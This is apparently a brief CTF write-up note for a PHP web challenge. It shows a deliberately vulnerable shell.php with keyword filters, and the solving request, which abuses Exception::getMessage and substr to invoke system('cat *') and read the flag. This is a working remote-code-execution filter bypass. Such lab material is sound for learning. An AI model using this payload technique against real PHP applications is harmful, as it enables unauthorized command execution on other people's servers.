![[Pasted image 20230501145553.png|800]]

```
/shell.php
```

```php
<?php

error_reporting(0);
show_source(__FILE__);

$a = $_GET["a"];
$b = $_GET["b"];
$c = $_GET["c"];
$d = $_GET["d"];
$e = $_GET["e"];
$f = $_GET["f"];
$g = $_GET["g"];

if(preg_match("/Error|ArrayIterator|SplFileObject/i", $a)) {
    die("你今天rce不了一点");
}


if(preg_match("/php/i", $b)) {
 die("别上🐎，想捣蛋啊哥们？");
}

if(preg_match("/Error|ArrayIterator/i", $c)) {
 die("你今天rce不了一点");
}


$class = new $a($b);
$str1 = substr($class->$c(),$d,$e);
$str2 = substr($class->$c(),$f,$g);
$str1($str2);

//flag.php 
```

```
/shell.php?a=Exception&b=systemcat *&c=getMessage&d=0&e=6&f=6&g=5
```

![[Pasted image 20230501145514.png|800]]

#Web #RCE #PHP #shell #bypass 